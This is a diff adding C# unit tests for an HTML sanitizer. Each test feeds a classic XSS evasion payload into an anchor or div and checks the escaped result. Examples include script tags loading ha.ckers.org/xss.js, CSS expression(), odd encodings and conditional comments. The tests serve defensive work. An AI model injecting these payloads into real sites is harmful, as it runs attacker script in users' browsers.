@@ -88,7 +88,7 @@ namespace UnitTests
             string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
             
             // Assert
-            string expected = "<a href=\"&#39;&#39;;!--\"<XSS>=&amp;{()}\">";
+            string expected = "<a href=\"&#39;&#39;;!--\"></a>";
             Assert.AreEqual(expected, actual);
         }
 
@@ -1497,6 +1497,1013 @@ tt	p://6&amp;#9;6.000146.0x7.147/"">XSS</A>";
             Assert.AreEqual(expected, actual, true);
         }
 
+        /// <summary>
+        /// A test for AnchorTag with no filter evasion
+        /// Example <!-- <A HREF="http://www.codeplex.com?url=<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>">XSS</A> -->
+        /// </summary>   
+        [TestMethod()]
+        public void AnchorTagNoFilterEvasionXSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<A HREF=\"http://www.codeplex.com?url=<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>\">XSS</A>";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<A HREF=\"http://www.codeplex.com?url=&lt;SRC=http://ha.ckers.org/xss.js&gt;&lt;/&gt;\">XSS</A>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with no filter evasion
+        /// Example <!-- <Div style="background-color: http://www.codeplex.com?url=<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivNoFilterEvasionXSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: http://www.codeplex.com?url=<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color: http://www.codeplex.com?url=&lt;SRC=http://ha.ckers.org/xss.js&gt;&lt;/&gt;\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with style expression and no filter evasion
+        /// Example <!-- <Div style="background-color: expression(<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>)"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivStyleExpressionNoFilterEvasionXSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: expression(<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>)\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color:(&lt;SRC=http://ha.ckers.org/xss.js&gt;&lt;/&gt;)\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for AnchorTag with non alpha non digit xss
+        /// Example <!-- <A HREF="http://www.codeplex.com?url=<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>">XSS</A> -->
+        /// </summary>   
+        [TestMethod()]
+        public void AnchorTagNonAlphaNonDigitXSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<A HREF=\"http://www.codeplex.com?url=<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\">XSS</A>";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<A HREF=\"http://www.codeplex.com?url=&lt;/XSS SRC=\">\">XSS</A>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with non alpha non digit xss
+        /// Example <!-- <Div style="background-color: http://www.codeplex.com?url=<SCRIPT/XSS SRC=http://ha.ckers.org/xss.js></SCRIPT>"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivNonAlphaNonDigitXSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: http://www.codeplex.com?url=<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color: http://www.codeplex.com?url=&lt;/XSS SRC=\">\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with style expression and non alpha non digit xss
+        /// Example <!-- <Div style="background-color: expression(<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>)"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivStyleExpressionNonAlphaNonDigitXSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: expression(<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>)\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color:(&lt;/XSS SRC=\">)\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for AnchorTag with non alpha non digit part 3 xss
+        /// Example <!-- <A HREF="http://www.codeplex.com?url=<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>">XSS</A> -->
+        /// </summary>   
+        [TestMethod()]
+        public void AnchorTagNonAlphaNonDigit3XSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<A HREF=\"http://www.codeplex.com?url=<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\">XSS</A>";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<A HREF=\"http://www.codeplex.com?url=&lt;/SRC=\">\">XSS</A>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with non alpha non digit part 3 xss
+        /// Example <!-- <Div style="background-color: http://www.codeplex.com?url=<SCRIPT/SRC=http://ha.ckers.org/xss.js></SCRIPT>"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivNonAlphaNonDigit3XSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: http://www.codeplex.com?url=<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color: http://www.codeplex.com?url=&lt;/SRC=\">\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with style expression and non alpha non digit part 3 xss
+        /// Example <!-- <Div style="background-color: expression(<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>)"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivStyleExpressionNonAlphaNonDigit3XSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: expression(<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>)\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color:(&lt;/SRC=\">)\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for AnchorTag with Extraneous open brackets xss
+        /// Example <!-- <A HREF="http://www.codeplex.com?url=<<SCRIPT>alert("XSS");//<</SCRIPT>">XSS</A> -->
+        /// </summary>   
+        [TestMethod()]
+        public void AnchorTagExtraneousOpenBracketsXSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<A HREF=\"http://www.codeplex.com?url=<<SCRIPT>alert(\"XSS\");//<</SCRIPT>\">XSS</A>";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<A HREF=\"http://www.codeplex.com?url=&lt;&lt;&gt;alert(\"></A>\">XSS";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with Extraneous open brackets xss
+        /// Example <!-- <Div style="background-color: http://www.codeplex.com?url=<<SCRIPT>alert("XSS");//<</SCRIPT>"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivExtraneousOpenBracketsXSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: http://www.codeplex.com?url=<<SCRIPT>alert(\"XSS\");//<</SCRIPT>\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color: http://www.codeplex.com?url=&lt;&lt;&gt;alert(\"></Div>\">";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with style expression and Extraneous open brackets xss
+        /// Example <!-- <Div style="background-color: expression(<<SCRIPT>alert("XSS");//<</SCRIPT>)"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivStyleExpressionExtraneousOpenBracketsXSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: expression(<<SCRIPT>alert(\"XSS\");//<</SCRIPT>)\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color:(&lt;&lt;&gt;alert(\"></Div>)\">";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for AnchorTag with No closing script tags xss
+        /// Example <!-- <A HREF="http://www.codeplex.com?url=<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>">XSS</A> -->
+        /// </summary>   
+        [TestMethod()]
+        public void AnchorTagNoClosingScriptTagsXSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<A HREF=\"http://www.codeplex.com?url=<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>\">XSS</A>";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<A HREF=\"http://www.codeplex.com?url=&lt;src=http://ha.ckers.org/xss.js?&lt;B&gt;\">XSS</A>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with No closing script tags xss
+        /// Example <!-- <Div style="background-color: http://www.codeplex.com?url=<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivNoClosingScriptTagsXSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: http://www.codeplex.com?url=<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color: http://www.codeplex.com?url=&lt;src=http://ha.ckers.org/xss.js?&lt;B&gt;\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with style expression and No closing script tags xss
+        /// Example <!-- <Div style="background-color: expression(<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>)"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivStyleExpressionNoClosingScriptTagsXSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: expression(<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>)\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color:(&lt;SRC=http://ha.ckers.org/xss.js?&lt;B&gt;)\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for AnchorTag with Protocol resolution in script tags xss
+        /// Example <!-- <A HREF="http://www.codeplex.com?url=<SCRIPT SRC=//ha.ckers.org/.j>">XSS</A> -->
+        /// </summary>   
+        [TestMethod()]
+        public void AnchorTagProtocolResolutionScriptXSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<A HREF=\"http://www.codeplex.com?url=<SCRIPT SRC=//ha.ckers.org/.j>\">XSS</A>";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<A HREF=\"http://www.codeplex.com?url=&lt;SRC=//ha.ckers.org/.j&gt;\">XSS</A>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with Protocol resolution in script tags xss
+        /// Example <!-- <Div style="background-color: http://www.codeplex.com?url=<SCRIPT SRC=//ha.ckers.org/.j>"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivProtocolResolutionScriptXSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: http://www.codeplex.com?url=<SCRIPT SRC=//ha.ckers.org/.j>\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color: http://www.codeplex.com?url=&lt;src=//ha.ckers.org/.j&gt;\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with style expression and Protocol resolution in script tags xss
+        /// Example <!-- <Div style="background-color: expression(<SCRIPT SRC=//ha.ckers.org/.j>)"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivStyleExpressionProtocolResolutionScriptXSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: expression(<SCRIPT SRC=//ha.ckers.org/.j>)\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color:(&lt;SRC=//ha.ckers.org/.j&gt;)\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for AnchorTag with no single quotes or double quotes or semicolons xss
+        /// Example <!-- <A HREF="http://www.codeplex.com?url=<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>">XSS</A> -->
+        /// </summary>   
+        [TestMethod()]
+        public void AnchorTagNoQuotesXSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<A HREF=\"http://www.codeplex.com?url=<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>\">XSS</A>";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<A HREF=\"http://www.codeplex.com?url=&lt;&gt;a=/XSS/alert(a.source)&lt;/&gt;\">XSS</A>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with no single quotes or double quotes or semicolons xss
+        /// Example <!-- <Div style="background-color: http://www.codeplex.com?url=<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivNoQuotesXSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: http://www.codeplex.com?url=<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color: http://www.codeplex.com?url=&lt;&gt;a=/XSS/alert(a.source)&lt;/&gt;\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with style expression and no single quotes or double quotes or semicolons xss
+        /// Example <!-- <Div style="background-color: expression(<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>)"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivStyleExpressionNoQuotesXSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: expression(<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>)\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color:(&lt;&gt;a=/XSS/alert(a.source)&lt;/&gt;)\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for AnchorTag with US-ASCII encoding xss
+        /// Example <!-- <A HREF="http://www.codeplex.com?url=¼script¾alert(¢XSS¢)¼/script¾">XSS</A> -->
+        /// </summary>   
+        [TestMethod()]
+        public void AnchorTagUSASCIIEncodingXSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<A HREF=\"http://www.codeplex.com?url=¼script¾alert(¢XSS¢)¼/script¾\">XSS</A>";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<A HREF=\"http://www.codeplex.com?url=&#188;&#190;alert(&#162;XSS&#162;)&#188;/&#190;\">XSS</A>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with US-ASCII encoding xss
+        /// Example <!-- <Div style="background-color: http://www.codeplex.com?url=¼script¾alert(¢XSS¢)¼/script¾"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivUSASCIIEncodingXSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: http://www.codeplex.com?url=¼script¾alert(¢XSS¢)¼/script¾\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color: http://www.codeplex.com?url=&#188;&#190;alert(&#162;XSS&#162;)&#188;/&#190;\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with style expression and US-ASCII encoding xss
+        /// Example <!-- <Div style="background-color: expression(¼script¾alert(¢XSS¢)¼/script¾)"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivStyleExpressionUSASCIIEncodingXSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: expression(¼script¾alert(¢XSS¢)¼/script¾)\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color:(&#188;&#190;alert(&#162;XSS&#162;)&#188;/&#190;)\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for AnchorTag with Downlevel-Hidden block xss
+        /// Example <!-- <A HREF="http://www.codeplex.com?url=<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->">XSS</A> -->
+        /// </summary>   
+        [TestMethod()]
+        public void AnchorTagDownlevelHiddenBlockXSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<A HREF=\"http://www.codeplex.com?url=<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->\">XSS</A>";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<A HREF=\"http://www.codeplex.com?url=&lt;!--[if gte IE 4]&gt;&lt;&gt;alert(&#39;XSS&#39;);&lt;/&gt;&lt;![endif]--&gt;\">XSS</A>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with Downlevel-Hidden block xss
+        /// Example <!-- <Div style="background-color: http://www.codeplex.com?url=<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivDownlevelHiddenBlockXSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: http://www.codeplex.com?url=<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color: http://www.codeplex.com?url=&lt;!--[if gte IE 4]&gt;&lt;&gt;alert(&#39;XSS&#39;);&lt;/&gt;&lt;![endif]--&gt;\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with style expression and Downlevel-Hidden block xss
+        /// Example <!-- <Div style="background-color: expression(<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->)"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivStyleExpressionDownlevelHiddenBlockXSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: expression(<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->)\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color:(&lt;!--[if gte IE 4]&gt;&lt;&gt;alert(&#39;XSS&#39;);&lt;/&gt;&lt;![endif]--&gt;)\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for AnchorTag with Html Quotes Encapsulation 1 xss
+        /// Example <!-- <A HREF="http://www.codeplex.com?url=<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>">XSS</A> -->
+        /// </summary>   
+        [TestMethod()]
+        public void AnchorTagHtmlQuotesEncapsulation1XSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<A HREF=\"http://www.codeplex.com?url=<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\">XSS</A>";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<A HREF=\"http://www.codeplex.com?url=&lt;a=\">\" SRC=\"http://ha.ckers.org/xss.js\">\">XSS</A>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with Html Quotes Encapsulation 1 xss
+        /// Example <!-- <Div style="background-color: http://www.codeplex.com?url=<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivHtmlQuotesEncapsulation1XSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: http://www.codeplex.com?url=<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color: http://www.codeplex.com?url=&lt;a=\">\" SRC=\"http://ha.ckers.org/xss.js\">\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with style expression and Html Quotes Encapsulation 1 xss
+        /// Example <!-- <Div style="background-color: expression(<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>)"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivStyleExpressionHtmlQuotesEncapsulation1XSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
